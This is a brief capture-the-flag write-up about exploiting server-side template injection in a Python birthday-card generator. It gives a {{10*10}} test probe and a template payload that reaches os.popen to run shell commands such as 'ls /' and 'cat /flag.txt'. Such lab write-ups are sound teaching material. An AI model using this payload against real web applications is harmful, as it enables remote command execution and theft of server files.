# Happy Birthday Card Generator

The website was simply accepting a name and generating a card.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

I tried to input HTML tags, it didn't work. Then I used command injections, again no luck.

But then I saw the backend server was Python based. You know what the first instinct is after that?

Server Side Template Injection!

I tried the following payload:

`{{10*10}}`

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

As we can see, SSTI PoC worked! Let's try and read /flag.txt. I used the following payload inspired from here: [https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part](https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part)

`{{"foo".class.base.subclasses()[182].init.globals['sys'].modules['os'].popen("ls /").read()}}`

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

I replaced the ls / command in payload by cat /flag.txt and got the flag!
